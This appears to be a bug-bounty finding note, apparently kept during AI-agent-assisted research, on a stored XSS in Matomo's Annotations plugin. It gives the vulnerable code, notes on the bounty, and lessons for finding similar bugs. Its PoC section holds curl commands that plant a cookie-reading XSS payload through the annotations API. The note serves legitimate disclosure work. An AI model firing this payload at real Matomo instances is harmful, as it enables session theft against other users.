# Matomo Annotations Stored XSS

Last updated: 2026-05-13

## Summary
Stored XSS in Matomo's Annotations plugin. VIEW access user can inject XSS that executes for ALL users viewing annotations (including Super User).

## Bounty
- Estimated: $777-$1,777 (Stored XSS, VIEW access)
- CVSS: 5.4 Medium (but real impact is higher due to persistence + privilege escalation path)

## Vulnerability Chain

```
User Input (VIEW access)
    ↓
filterNote() — NO htmlspecialchars(), only length truncation
    ↓
Model::createAnnotation() — raw SQL insert
    ↓
DB stores unsanitized HTML
    ↓
_annotation.twig renders {{ annotation.note|raw }}
    ↓
XSS executes in ALL users' browsers
```

## Key Code Evidence

### 1. Missing Input Sanitization
**File:** `plugins/Annotations/API.php:324-335`
```php
private function filterNote(?string $note): ?string
{
    if (empty($note)) { return $note; }
    if (mb_strlen($note) > 255) {
        $note = mb_substr($note, 0, 254) . '…';
    }
    return $note;  // ← NO htmlspecialchars() or strip_tags()
}
```

### 2. Unsafe Template Rendering
**File:** `plugins/Annotations/templates/_annotation.twig:32`
```twig
{{ annotation.note|raw }}  <!-- bypasses Twig auto-escaping -->
```

### 3. Contrast with Proper Escaping (same plugin!)
**File:** `plugins/Annotations/templates/getEvolutionIcons.twig:8`
```twig
(counts.note|e('html_attr'))  <!-- properly escaped -->
```

### 4. Auth Requirement
**File:** `plugins/Annotations/API.php:300-304`
```php
private static function checkUserCanAddNotesFor(int $idSite): void
{
    if (!Piwik::isUserHasViewAccess($idSite) || Piwik::isUserIsAnonymous()) {
        throw new Exception("The current user is not allowed to add notes for site #$idSite.");
    }
}
```
- Requires: VIEW access (not anonymous, not admin)
- Lowest privilege level

## PoC
```bash
# Create annotation with XSS payload
curl -k "https://TARGET/matomo/index.php?module=API&method=Annotations.add&format=JSON" \
  --data-urlencode "idSite=1" \
  --data-urlencode "date=2026-05-13" \
  --data-urlencode "note=<img src=x onerror=alert(document.cookie)>" \
  --data-urlencode "token_auth=VIEW_USER_TOKEN"

# Verify stored payload
curl -k "https://TARGET/matomo/index.php?module=API&method=Annotations.get&format=JSON&idSite=1&idNote=1&token_auth=TOKEN"
```

## Report Files
- `/tmp/bugbounty/matomo-annotations-xss/` — complete report package
- `/tmp/bugbounty/matomo-annotations-xss.zip` — zipped for submission

## Status
- ✅ Code audit complete
- ✅ PoC script created
- ✅ Evidence HTML files created
- ✅ Report package ready
- ⏳ Awaiting submission

## Lessons Learned

### Pattern: Twig `|raw` + Missing Input Sanitization
This is a HIGH-VALUE XSS pattern for Twig-based PHP projects:
1. Find `|raw` in templates (bypasses auto-escaping)
2. Trace variable back to source
3. Check if input is sanitized before storage
4. If no sanitization → confirmed XSS

### Pattern: Inconsistency as Evidence
When the same plugin/module has some templates using `|raw` and others using proper escaping (`|e('html_attr')`), the `|raw` instances are likely bugs. This inconsistency is strong evidence for the report.

### Severity Prioritization
User wants HIGH findings analyzed before MEDIUM. When agent suggested starting from MEDIUM, user corrected: "kenapa tidak yang high dulu?" — Always analyze in order: CRITICAL → HIGH → MEDIUM → LOW.
